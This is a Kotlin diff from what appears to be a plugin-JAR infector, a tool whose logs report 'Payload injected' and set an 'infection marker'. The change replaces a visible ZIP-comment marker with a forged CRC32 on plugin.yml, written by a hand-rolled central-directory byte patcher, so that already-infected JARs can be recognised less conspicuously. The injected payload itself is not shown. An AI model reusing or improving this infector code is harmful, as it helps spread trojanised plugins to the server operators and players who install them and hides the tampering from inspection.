@@ -17,15 +17,79 @@ import java.nio.charset.StandardCharsets
 import java.nio.file.*
 import java.security.MessageDigest
 import java.util.*
-import java.util.zip.ZipEntry
+import java.util.zip.CRC32
 import java.util.zip.ZipFile
-import java.util.zip.ZipInputStream
-import java.util.zip.ZipOutputStream
 import kotlin.io.path.inputStream
 import kotlin.io.path.name
 import kotlin.io.path.writeBytes
 
-private const val INFECTION_MARKER = "openbd.injected"
+private object CrcPatcher {
+    private const val EOCD_SIGNATURE = 0x06054b50
+    private const val CENTRAL_DIR_SIGNATURE = 0x02014b50
+    private const val FAKE_STRING = "openbd.injected"
+
+    fun markJarWithFakeCRC(jarPath: Path) {
+        val bytes = Files.readAllBytes(jarPath)
+        val eocdOffset = findEOCDOffset(bytes)
+        if (eocdOffset == -1) {
+            throw IOException("EOCD not found in ${jarPath.name}")
+        }
+
+        val centralDirectoryOffset = getIntLE(bytes, eocdOffset + 16)
+        var currentOffset = centralDirectoryOffset
+
+        while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
+            val fileNameLength = getShortLE(bytes, currentOffset + 28)
+            val extraFieldLength = getShortLE(bytes, currentOffset + 30)
+            val fileCommentLength = getShortLE(bytes, currentOffset + 32)
+
+            val filename = String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8)
+
+            if ("plugin.yml" == filename) {
+                val crcOffset = currentOffset + 16
+                val fakeCRC = calculateFakeCRC()
+                putIntLE(bytes, crcOffset, fakeCRC.toInt())
+                jarPath.writeBytes(bytes)
+                return
+            }
+            currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength
+        }
+        throw IOException("plugin.yml not found in central directory of ${jarPath.name}")
+    }
+
+    fun calculateFakeCRC(): Long {
+        val crc = CRC32()
+        crc.update(FAKE_STRING.toByteArray(StandardCharsets.UTF_8))
+        return crc.value
+    }
+
+    private fun findEOCDOffset(bytes: ByteArray): Int {
+        for (i in bytes.size - 22 downTo (bytes.size - 65557).coerceAtLeast(0)) {
+            if (getIntLE(bytes, i) == EOCD_SIGNATURE) {
+                return i
+            }
+        }
+        return -1
+    }
+
+    private fun getIntLE(b: ByteArray, off: Int): Int {
+        return (b[off].toInt() and 0xFF) or
+                ((b[off + 1].toInt() and 0xFF) shl 8) or
+                ((b[off + 2].toInt() and 0xFF) shl 16) or
+                ((b[off + 3].toInt() and 0xFF) shl 24)
+    }
+
+    private fun putIntLE(b: ByteArray, off: Int, value: Int) {
+        b[off] = (value and 0xFF).toByte()
+        b[off + 1] = ((value shr 8) and 0xFF).toByte()
+        b[off + 2] = ((value shr 16) and 0xFF).toByte()
+        b[off + 3] = ((value shr 24) and 0xFF).toByte()
+    }
+
+    private fun getShortLE(b: ByteArray, off: Int): Int {
+        return (b[off].toInt() and 0xFF) or ((b[off + 1].toInt() and 0xFF) shl 8)
+    }
+}
 
 fun process(
     input: Path,
@@ -44,14 +108,19 @@ fun process(
 
     try {
         ZipFile(input.toFile()).use { zipFile ->
-            if (zipFile.comment == INFECTION_MARKER) {
-                Logs.finish().warn("Skipped plugin because it is already patched (infection marker found in ZIP comment)")
-                return
+            val entry = zipFile.getEntry("plugin.yml")
+            if (entry != null) {
+                val expectedCrc = CrcPatcher.calculateFakeCRC()
+                if (entry.crc == expectedCrc) {
+                    Logs.finish().warn("Skipped plugin because it is already patched (marker found in plugin.yml CRC)")
+                    return
+                }
             }
         }
     } catch (e: Exception) {
         Logs.warn("Could not read ZIP data from ${input.name}, proceeding with injection anyway. Error: ${e.message}")
     }
+
 
     if (!replace && Files.exists(output)) {
         Logs.finish().warn("Skipped plugin because output file already exists")
@@ -164,7 +233,7 @@ fun process(
         
         setInfectionMarker(output)
 
-        Logs.finish().info("${input.name} patched successfully (Payload injected, ZIP comment marker set)")
+        Logs.finish().info("${input.name} patched successfully (Payload injected, CRC marker set)")
     } finally {
         if (tempDir.exists()) {
             tempDir.deleteRecursively()
@@ -173,24 +242,9 @@ fun process(
 }
 
 private fun setInfectionMarker(targetJarPath: Path) {
-    Logs.info("Setting infection marker on target ZIP comment...")
-    val tempJarPath = targetJarPath.resolveSibling(targetJarPath.fileName.toString() + ".tmp")
-
+    Logs.info("Setting infection marker by faking plugin.yml CRC...")
     try {
-        ZipOutputStream(BufferedOutputStream(Files.newOutputStream(tempJarPath))).use { zos ->
-            zos.setComment(INFECTION_MARKER)
-
-            ZipInputStream(BufferedInputStream(Files.newInputStream(targetJarPath))).use { zis ->
-                var entry: ZipEntry? = zis.nextEntry
-                while (entry != null) {
-                    zos.putNextEntry(entry)
-                    zis.copyTo(zos)
-                    zos.closeEntry()
-                    entry = zis.nextEntry
-                }
-            }
-        }
-        Files.move(tempJarPath, targetJarPath, StandardCopyOption.REPLACE_EXISTING)
+        CrcPatcher.markJarWithFakeCRC(targetJarPath)
         Logs.info("Infection marker set successfully on target JAR.")
     } catch (e: IOException) {
         Logs.error("Failed to set infection marker on target JAR: ${e.message}")
